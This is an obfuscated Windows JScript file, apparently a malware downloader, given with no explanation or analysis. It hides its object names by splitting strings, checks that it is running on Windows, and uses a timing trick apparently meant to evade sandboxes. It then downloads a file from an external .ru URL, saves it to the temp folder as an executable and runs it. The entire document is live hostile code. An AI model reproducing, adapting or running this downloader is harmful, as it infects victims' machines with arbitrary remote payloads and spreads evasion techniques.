var H = false;
var N = "Create"+"Object";
var Z = function Q() {return WScript[N]("WScript"+".Shell");}(), QR = 11;
var SO = "MSXML2"+".XMLHTTP";
var KW = 2;
var V = KW - 2;
function NR(JT){Z["Run"](JT, V, V);};
function G0(){return SO + "";};
function P(M, SL){V = V * 1; return M - SL;};
function OK(){return N;};
/*@cc_on
  @if (@_win32 || @_win64)
    H = true;
  @end
@*/
if (H)
{
var E = "";
function KK(){return 22;};
var F = 0; var P0 = 0;
function X()
{
var X0 = new this["Date"]();
var SZ = X0["getUTCMilliseconds"]();
WScript["Sleep"](KK());
var X0 = new this["Date"]();
var A = X0["getUTCMilliseconds"]();
WScript["Sleep"](KK());
var X0 = new this["Date"]();
var K = X0["getUTCMilliseconds"]();
var F = "L";
F = P(A, SZ);
var P0 = "RN";
P0 = P(K, A);
E = "open";
return P(F, P0);
}
var EV = false;
var P1 = false;
for (var C = V; C < KK() * 1; C++){if (X() != V){
EV = true; 
P0 = "31" + 11 * F + P0; 
P1 = true; 
break;
}}
function G() {return ((EV == true) && (EV == P1)) ? 1 : V;};
if (EV && G() && P1){
function FH() {return Z["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "nOp8eb2AK8Vc4.ex" + "e";};
 LM = G0();
 PC = WScript[N](LM);
 var Y = 1;
do { 
	for (;Y;){
	try {
		if (Y == 1)
		{
			PC[E]("GET", "http://webkits.ru/mn3dka", false);
			PC["send"]();
			I = "Sleep";
			Y = 2;
		}
		WScript[I](KK() + 120); 
		if (PC["readystate"] < 2 * 2) continue;
		Y = V;
		function B(WH) {var D = (1, 2, 3, 4, 5, WH); return D;};
		XJ = WScript[OK()]("ADODB.Stream");
		LM = XJ;
		LM[E]();
		LM["type"] = B(1);
		LM["write"](PC["ResponseBody"]);
		XJ["position"] = B(V);
		LM["Save" + "ToFile"](FH(), 2);
		XJ["cl"+"ose"]();
		E0 = FH();
		NR(E0);
	} catch(GJ){};};
}while (Y);
}
}

